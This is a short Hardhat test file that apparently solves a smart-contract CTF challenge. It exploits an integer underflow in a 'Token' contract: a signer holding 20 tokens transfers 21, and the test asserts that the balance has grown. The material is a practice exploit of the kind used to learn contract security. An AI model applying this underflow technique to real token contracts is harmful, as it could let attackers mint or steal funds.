import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe.only("Token expolit", function () {
  it("Should get more tokens", async function () {

    // setup
    const [deployer, s1] = await ethers.getSigners();
    const ContractFactory = await ethers.getContractFactory("Token");
    const contract = await ContractFactory.deploy(21000000);
    await contract.deployed();
    await contract.connect(deployer).transfer(s1.address, 20);

    // Hack

    // await contract.connect(s1).transfer(s1.address, 0);
    // await contract.connect(s1).transfer(s1.address, 1);

    console.log(await contract.balanceOf(s1.address));
    const zeroAddress = await contract.zeroAddress();
    console.log(zeroAddress);
    await contract.connect(s1).transfer(zeroAddress, 21);
    console.log(await contract.balanceOf(s1.address));

    // console.log(await contract.connect(s1).test());

    
    // validate
  	expect(
	  	await contract.balanceOf(s1.address)
	  ).to.greaterThan(20)
    
  });
});
